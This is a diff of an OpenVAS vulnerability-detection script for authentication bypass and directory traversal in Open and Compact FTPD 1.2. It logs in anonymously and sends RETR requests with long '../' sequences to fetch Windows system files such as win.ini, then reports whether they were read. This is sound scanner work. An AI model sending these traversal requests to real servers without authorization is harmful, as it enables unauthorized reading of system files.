@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_open_n_compact_ftpd_server_mult_vun.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_open_n_compact_ftpd_server_mult_vun.nasl 12100 2018-10-25 13:58:16Z cfischer $
 #
 # Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities
 #
@@ -27,113 +27,122 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803733");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 12100 $");
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-25 15:58:16 +0200 (Thu, 25 Oct 2018) $");
   script_tag(name:"creation_date", value:"2013-08-12 11:33:28 +0530 (Mon, 12 Aug 2013)");
   script_name("Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
+  script_family("FTP");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available", "Host/runs_windows");
+
+  script_xref(name:"URL", value:"http://1337day.com/exploit/21078");
+  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080072");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122747");
+  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/open-and-compact-ftp-server-12-bypass-directory-traversal");
 
   script_tag(name:"summary", value:"The host is running Open and Compact FTPD server and is prone to
-authentication bypass and directory traversal vulnerabilities.");
+  authentication bypass and directory traversal vulnerabilities.");
+
   script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack request and check whether it
-is able to read the system file or not.");
+  is able to read the system file or not.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year
-since the disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.");
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective
+  features, remove the product or replace the product by another one.");
+
   script_tag(name:"insight", value:"Multiple flaws due to,
 
   - Access not being restricted to various FTP commands before a user is
   properly authenticated.
 
   - An Error in handling certain requests.");
+
   script_tag(name:"affected", value:"Open and Compact FTP Server version 1.2 and prior.");
+
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute FTP commands
-without any authentication and read arbitrary files on the affected
-application.");
+  without any authentication and read arbitrary files on the affected application.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name:"URL", value:"http://1337day.com/exploit/21078");
-  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080072");
-  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122747");
-  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/open-and-compact-ftp-server-12-bypass-directory-traversal");
-  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
-  script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl");
-  script_require_ports("Services/ftp", 21);
   exit(0);
 }
 
 include("ftp_func.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-ftpPort = get_ftp_port(default:21);
-banner = get_ftp_banner(port:ftpPort);
-if("Gabriel's FTP Server" >!< banner){
-  exit(0);
-}
+port = get_ftp_port( default:21 );
+banner = get_ftp_banner( port:port );
+if( ! banner || "Gabriel's FTP Server" >!< banner )
+  exit( 0 );
 
-soc = open_sock_tcp(ftpPort);
-if(!soc){
-  exit(0);
-}
+soc = open_sock_tcp( port );
+if( ! soc )
+  exit( 0 );
 
-user = get_kb_item("ftp/login");
-pass = get_kb_item("ftp/password");
+user = get_kb_item( "ftp/login" );
+pass = get_kb_item( "ftp/password" );
 
-if(!user){
+if( ! user )
   user = "anonymous";
+
+if( ! pass ) {
+  vtstrings = get_vt_strings();
+  pass = string( vtstrings["lowercase"], "@example.com" );
 }
 
-if(!pass){
-  pass = string("anonymous");
+send( socket:soc, data:string( "USER ", user, "\r\n" ) );
+buf = recv( socket:soc, length:512 );
+
+send( socket:soc, data:string( "PASS ", pass, "\r\n" ) );
+buf = recv( socket:soc, length:512 );
+
+if( "230 User" >!< buf && "logged in" >!< buf ) {
+  ftp_close( socket:soc );
+  exit( 0 );
 }
 
-send(socket:soc, data:string("USER ", user, "\r\n"));
-buf = recv(socket:soc, length:512);
-
-send(socket:soc, data:string("PASS ", pass, "\r\n"));
-buf = recv(socket:soc, length:512);
-
-if("230 User" >!< buf && "logged in" >!< buf)
-{
- close(soc);
- exit(0);
+port2 = ftp_get_pasv_port( socket:soc );
+if( ! port2 ) {
+  ftp_close( socket:soc );
+  exit( 0 );
 }
 
-ftpPort2 = ftp_get_pasv_port(socket:soc);
-if(!ftpPort2){
-  close(soc);
-  exit(0);
+soc2 = open_sock_tcp( port2, transport:get_port_transport( port ) );
+if( ! soc2 ) {
+  ftp_close( socket:soc );
+  exit( 0 );
 }
 
-soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
-if(!soc2)
-{
-  close(soc);
-  exit(0);
-}
+files = traversal_files( "Windows" );
 
-files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
-foreach file (files)
-{
+foreach pattern( keys( files ) ) {
+
+  file = files[pattern];
   file = "../../../../../../../../../../../../../../../../" + file;
-  attackreq = string("RETR ", file);
-  send(socket:soc, data:string(attackreq, "\r\n"));
 
-  result = ftp_recv_data(socket:soc2);
+  req = string( "RETR ", file );
+  send( socket:soc, data:string( req, "\r\n" ) );
 
-  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result)
-  {
-    security_message(port:ftpPort);
-    close(soc2);
-    close(soc);
-    exit(0);
+  res = ftp_recv_data( socket:soc2 );
+
+  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
+    ftp_close( socket:soc );
+    close( soc2 );
+    report  = "Used request:  " + req + '\n';
+    report += "Received data: " + match;
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-close(soc);
-close(soc2);
+ftp_close( socket:soc );
+close( soc2 );
+exit( 0 );
